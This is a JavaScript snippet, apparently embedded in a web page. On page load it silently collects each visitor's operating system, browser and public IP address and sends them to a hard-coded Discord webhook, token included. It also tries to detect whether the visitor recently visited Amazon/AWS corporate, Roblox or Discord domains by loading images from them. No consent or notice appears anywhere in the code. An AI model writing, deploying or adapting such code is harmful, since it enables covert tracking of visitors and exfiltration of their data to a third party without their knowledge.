// Function to get the user's browser and OS information
      function getUserInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;

            let os = "Unknown OS";
            if (platform.indexOf('Win') !== -1) os = 'Windows';
            if (platform.indexOf('Mac') !== -1) os = 'MacOS';
            if (platform.indexOf('Linux') !== -1) os = 'Linux';
            if (/Android/.test(userAgent)) os = 'Android';
            if (/iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';

            let browser = "Unknown Browser";
            if (userAgent.indexOf('Firefox') > -1) browser = "Firefox";
            else if (userAgent.indexOf('Chrome') > -1) browser = "Chrome";
            else if (userAgent.indexOf('Safari') > -1) browser = "Safari";
            else if (userAgent.indexOf('Edge') > -1) browser = "Edge";
            else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = "Opera";
            else if (userAgent.indexOf('MSIE') > -1 || !!document.documentMode) browser = "Internet Explorer";

            return {os, browser};
        }

        // Function to check if specific URLs have been visited in the past 48 hours
        async function checkVisitedUrls() {
            const domains = [
                ".aws.dev", ".aws.com", ".amazon.com", ".amazon-corp.com", ".a2z.com", ".roblox.com", ".discord.com"
            ];

            const visitedUrls = [];

            // Try to detect cached resources from each domain using prefetch/ping methods
            for (let domain of domains) {
                const url = `https://${domain}`;
                try {
                    // Load an image to check if the domain is cached
                    const img = new Image();
                    img.src = url;
                    img.onload = function() {
                        visitedUrls.push(domain);
                        displayVisitedUrls(visitedUrls);
                    };
                } catch (error) {
                    console.log(`Error checking ${domain}:`, error);
                }
            }
        }

        // Function to display visited URLs on the page
        function displayVisitedUrls(visitedUrls) {
            const visitedSection = document.getElementById("visited-urls");
            if (visitedUrls.length > 0) {
                visitedSection.innerHTML = `<strong>Recently Visited Domains:</strong> <br> ${visitedUrls.join(", ")}`;
            } else {
                visitedSection.innerHTML = `<strong>No recently visited domains detected.</strong>`;
            }
        }

    // Function to get user's public IP address using a third-party service
        async function getIPAddress() {
            try {
                // Use a third-party API like ipify or ipinfo.io to get the user's public IP address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip; // Return the IP address
            } catch (error) {
                console.error("Failed to fetch IP address:", error);
                return "IP Not Found"; // Return a default message if failed
            }
        }

        // Function to send the info to the Discord webhook
        async function sendInfoToWebhook() {
            const userInfo = getUserInfo();
            const ipAddress = await getIPAddress();
            const webhookURL = "https://discord.com/api/webhooks/1294771673937088575/VM6SHoyAUfr8FWLBL4xuVmUIFobmNAtrOtRM4iFZDVYkID0EmXJA23fEguiU_Hp1CIZv";

            const payload = {
                content: `User Info: OS - ${userInfo.os}, Browser - ${userInfo.browser}, IP Address - ${ipAddress}`
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log("Information sent to Discord webhook.");
                } else {
                    console.error("Failed to send info to Discord.");
                }
            } catch (error) {
                console.error("Error sending info:", error);
            }
        }

        // Send info and check visited URLs when the page loads
        window.onload = function() {
            sendInfoToWebhook();
            checkVisitedUrls();
        };
